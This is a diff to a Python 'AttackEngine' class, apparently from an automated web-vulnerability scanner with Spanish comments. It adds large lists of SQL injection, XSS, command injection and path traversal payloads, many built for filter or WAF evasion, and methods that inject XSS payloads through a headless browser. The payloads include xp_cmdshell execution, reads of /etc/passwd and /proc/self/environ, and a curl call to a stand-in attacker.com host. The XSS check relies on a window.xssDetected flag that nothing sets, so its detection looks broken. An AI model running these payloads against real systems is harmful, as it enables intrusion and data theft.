@@ -1,5 +1,5 @@
 import asyncio
-from typing import List, Dict
+from typing import List, Dict, Any
 import json
 import random
 from smart_detector import SmartDetector
@@ -54,6 +54,184 @@ class AttackEngine:
         # Asegurar que existe el directorio de herramientas
         if not os.path.exists(self.tools_dir):
             os.makedirs(self.tools_dir)
+
+        self.sql_payloads = {
+            "basic": [
+                "' OR '1'='1--",
+                "'/**/OR/**/1=1--",
+                "' UNION ALL SELECT NULL,NULL,NULL--",
+                "'/**/UNION/**/ALL/**/SELECT/**/1,2,3--"
+            ],
+            "blind_time": [
+                "' OR SLEEP(5)--",
+                "' OR IF(1=1,SLEEP(5),0)--",
+                "1' WAITFOR DELAY '0:0:5'--",
+                "' OR BENCHMARK(5000000,MD5(1))--"
+            ],
+            "blind_boolean": [
+                "1' AND SUBSTRING((SELECT database()),1,1)='m'--",
+                "1' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--"
+            ],
+            "error_based": [
+                "1' AND 1=CAST('x' AS INTEGER)--",
+                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+                "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(61),version(),CHAR(61))x FROM information_schema.tables GROUP BY x)--"
+            ],
+            "waf_evasion": [
+                "'%20oR%20TRUE%20--",
+                "') OR ('x'='x",
+                "'||CHR(39)||CHR(79)||CHR(82)||CHR(39)||CHR(49)||CHR(61)||CHR(49)--",
+                "/**/UnIoN/**/SeLeCt/**/"
+            ],
+            "db_specific": {
+                "mysql": [
+                    "' AND (SELECT 6 FROM(SELECT COUNT(*),CONCAT(0x7176767176,(SELECT MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,50)),0x7176767176,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
+                    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--"
+                ],
+                "postgresql": [
+                    "' AND 1=cast(version() as integer)--",
+                    "' AND 1 = ANY(SELECT 1 FROM pg_sleep(5))--"
+                ],
+                "mssql": [
+                    "'; WAITFOR DELAY '0:0:5'--",
+                    "'; EXEC xp_cmdshell 'dir'--"
+                ],
+                "oracle": [
+                    "' || dbms_pipe.receive_message(('a'),5)--",
+                    "' AND 1=UTL_INADDR.get_host_address('10.0.0.1')--"
+                ]
+            }
+        }
+
+        self.xss_payloads = {
+            "basic": [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "javascript:alert(1)"
+            ],
+            "filter_evasion": [
+                "<scr<script>ipt>alert(1)</scr<script>ipt>",
+                "<img src=x oNeRrOr=alert(1)>",
+                "data:text/html,<script>alert(1)</script>",
+                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+            ],
+            "scriptless": [
+                "<input onfocus=alert(1) autofocus>",
+                "<body onload=alert(1)>",
+                "<iframe srcdoc='<script>alert(1)</script>'>",
+                "onerror=alert(1) src=x <img>"
+            ],
+            "framework_specific": {
+                "angular": [
+                    "{{constructor.constructor('alert(1)')()}}",
+                    "{{_''.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}"
+                ],
+                "react": [
+                    "dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}",
+                    "<div>{{''.constructor.constructor('alert(1)')()}}</div>"
+                ],
+                "vue": [
+                    "v-html=\"'<img src=x onerror=alert(1)>'\"",
+                    ":href=\"javascript:alert(1)\""
+                ]
+            },
+            "dom_based": [
+                "javascript:window['al'+'ert'](1)",
+                "<script>eval(atob('YWxlcnQoMSk='))</script>",
+                "window[String.fromCharCode(97,108,101,114,116)](1)"
+            ],
+            "advanced_obfuscation": [
+                "<svg onload=eval('al'+'ert(1)')>",
+                "<img src=x onerror=Function('ale'+'rt(1)')()>",
+                ''.join(chr(c) for c in [60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62]),
+                "eval(\\u0061lert(1))"
+            ]
+        }
+
+        self.command_injection_payloads = {
+            "basic": [
+                ";whoami",
+                "&dir",
+                "|cat /etc/passwd",
+                "$(id)"
+            ],
+            "alternative_separators": [
+                "&&whoami",
+                "||id",
+                ";sleep 5",
+                "&timeout 5"
+            ],
+            "obfuscated": [
+                ";`w``h``o``a``m``i`",
+                "$(sleep${IFS}5)",
+                ";ECHO is on.|whoami",
+                ";uname${IFS}-a"
+            ],
+            "advanced": [
+                ";curl${IFS}http://attacker.com",
+                "&tasklist",
+                ";ping${IFS}-c${IFS}5${IFS}127.0.0.1",
+                "|net users" 
+            ],
+            "blind": [
+                "`sleep 10`",
+                "$(ping -c 10 127.0.0.1)",
+                "& timeout /t 10",
+                "| waitfor /t 10 someprocess"
+            ]
+        }
+
+        self.path_traversal_payloads = {
+            "basic": [
+                "../etc/passwd",
+                "..\\windows\\system32\\cmd.exe",
+                "/etc/passwd",
+                "C:\\Windows\\System32\\drivers\\etc\\hosts"
+            ],
+            "encoded": [
+                "%2e%2e%2fetc%2fpasswd",
+                "%252e%252e%252fetc%252fpasswd",
+                "..%5cwindows%5csystem32",
+                "%c0%ae%c0%ae%c0%af"
+            ],
+            "filter_evasion": [
+                "....//....//etc/passwd",
+                ".././.././etc/passwd",
+                "..%c0%afetc%c0%afpasswd",
+                "../../../../../../../../../../etc/passwd%00"
+            ],
+            "advanced": [
+                "....//....//....//....//etc//passwd",
+                "../////etc/////passwd",
+                "..\\..\\..\\..\\windows\\system32",
+                "/proc/self/environ",
+                "/proc/self/cmdline",
+                "/proc/self/mountinfo"
+            ]
+        }
+
+        self.error_detection_payloads = {
+            "basic": [
+                "param=invalid'value",
+                "id=-1 OR 1=1",
+                "../../../../../../../../etc/passwd",
+                "<invalid>",
+                "1/0"
+            ],
+            "debug": [
+                "debug=true",
+                "test=1",
+                "show_errors=1",
+                "display_errors=1"
+            ],
+            "version": [
+                "version()",
+                "@@version",
+                "SELECT VERSION()",
+                "SHOW VARIABLES"
+            ]
+        }
 
     def get_tool_path(self, tool_name: str) -> str:
         """
@@ -436,6 +614,100 @@ class AttackEngine:
                 print(f"Error en test SQL injection: {str(e)}")
         
         return results
+
+    async def test_xss(self, page, endpoint: str) -> List[Dict]:
+        findings = []
+        
+        for category, payloads in self.xss_payloads.items():
+            if isinstance(payloads, dict):
+                # Manejar payloads específicos de frameworks
+                for framework, framework_payloads in payloads.items():
+                    findings.extend(await self._test_framework_xss(page, endpoint, framework, framework_payloads))
+            else:
+                # Manejar payloads generales
+                for payload in payloads:
+                    try:
+                        # Aplicar payload
+                        escaped_payload = payload.replace('"', '\\"')
+                        result = await page.evaluate(f"""
+                            async () => {{
+                                try {{
+                                    // Insertar payload en varios contextos
+                                    document.body.innerHTML += '{escaped_payload}';
+                                    
+                                    // Verificar si el payload se ejecutó
+                                    return {{
+                                        executed: window.xssDetected || false,
+                                        context: document.body.innerHTML
+                                    }};
+                                }} catch (e) {{
+                                    return {{ error: e.toString() }};
+                                }}
+                            }}
+                        """)
+
+                        if result.get("executed"):
+                            findings.append({
+                                "type": "xss_vulnerability",
+                                "category": category,
+                                "payload": payload,
+                                "context": result.get("context", "unknown"),
+                                "severity": "high"
+                            })
+                            
+                    except Exception as e:
+                        print(f"Error testing XSS payload {payload}: {str(e)}")
+
+        return findings
+
+    async def _test_framework_xss(self, page, endpoint: str, framework: str, payloads: List[str]) -> List[Dict]:
+        findings = []
+        
+        # Detectar framework
+        framework_detected = await page.evaluate(f"""
+            () => {{
+                return {{
+                    angular: typeof angular !== 'undefined' || document.querySelector('[ng-app]'),
+                    react: typeof React !== 'undefined',
+                    vue: typeof Vue !== 'undefined'
+                }}['{framework}'];
+            }}
+        """)
+
+        if framework_detected:
+            for payload in payloads:
+                try:
+                    result = await page.evaluate(f"""
+                        async () => {{
+                            try {{
+                                const elem = document.createElement('div');
+                                elem.setAttribute('id', 'xss-test');
+                                elem.innerHTML = '{payload.replace("'", "\\'")}';
+                                document.body.appendChild(elem);
+                                
+                                return {{
+                                    executed: window.xssDetected || false,
+                                    context: elem.innerHTML
+                                }};
+                            }} catch (e) {{
+                                return {{ error: e.toString() }};
+                            }}
+                        }}
+                    """)
+
+                    if result.get("executed"):
+                        findings.append({
+                            "type": "framework_xss",
+                            "framework": framework,
+                            "payload": payload,
+                            "context": result.get("context", "unknown"),
+                            "severity": "critical"
+                        })
+
+                except Exception as e:
+                    print(f"Error testing {framework} XSS payload {payload}: {str(e)}")
+
+        return findings
 
     def get_bypass_findings(self) -> List[Dict]:
         """
